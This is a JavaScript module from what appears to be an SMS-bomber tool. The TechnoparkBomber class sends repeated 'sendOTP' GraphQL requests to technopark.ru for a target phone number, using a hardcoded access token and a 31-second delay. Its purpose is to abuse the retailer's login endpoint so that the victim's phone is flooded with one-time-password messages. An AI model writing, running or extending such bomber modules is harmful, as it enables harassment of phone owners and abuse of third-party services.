const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

class TechnoparkBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.data = {
            operationName: "AuthStepOne",
            query: "mutation AuthStepOne($phone: String!, $token: String!, $cityId: ID!) @access(token: $token) @city(id: $cityId) {\n  sendOTP(phone: $phone)\n}\n",
            variables: {phone: this.phone, token: "m0ji0n9k9f8p9n48ue7lvc5ap4", cityId: "36966"}
        };
    }
    headers = {
    }
    requestType = requestTypes.post;
    static country = "RU";
    siteName = "technopark";
    delay = 31000;
    url = `https://www.technopark.ru/graphql/`;  
}
module.exports = TechnoparkBomber;